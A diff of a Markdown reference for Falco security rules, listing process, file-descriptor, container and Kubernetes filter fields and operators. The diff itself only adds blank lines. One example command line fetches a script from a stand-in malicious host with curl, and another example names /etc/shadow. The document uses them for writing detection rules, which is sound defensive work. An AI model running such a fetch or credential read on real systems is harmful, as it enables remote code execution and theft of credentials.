@@ -48,6 +48,7 @@ Falco enforces strict severity classification:
 ## 3. Syscall Fields & Filter Operators
 
 ### Process Context Fields
+
 - `proc.name`: Basename of the executing process (e.g., `bash`, `curl`, `python3`).
 - `proc.cmdline`: Full process command line with arguments (e.g., `curl -fsSL http://malicious.io/sh`).
 - `proc.pname`: Basename of parent process (e.g., `containerd-shim`, `dockerd`).
@@ -55,6 +56,7 @@ Falco enforces strict severity classification:
 - `proc.cwd`: Current working directory of the process.
 
 ### File Descriptor (I/O) Fields
+
 - `fd.name`: Target path of the open/read/write operation (e.g., `/etc/shadow`).
 - `fd.directory`: Directory containing the target file.
 - `fd.sip`: Source IP address for network socket events.
@@ -63,6 +65,7 @@ Falco enforces strict severity classification:
 - `fd.dport`: Destination port number.
 
 ### Container & Kubernetes Context
+
 - `container.id`: Unique container ID string (or `host`).
 - `container.name`: Name assigned to container.
 - `container.image.repository`: Container image registry and repository name.
@@ -70,6 +73,7 @@ Falco enforces strict severity classification:
 - `k8s.ns.name`: Kubernetes namespace.
 
 ### Boolean Operators
+
 - `and`, `or`, `not`
 - `in`: Membership test against a list or tuple: `proc.name in (bash, sh, zsh)`.
 - `startswith`, `endswith`, `contains`, `glob`.
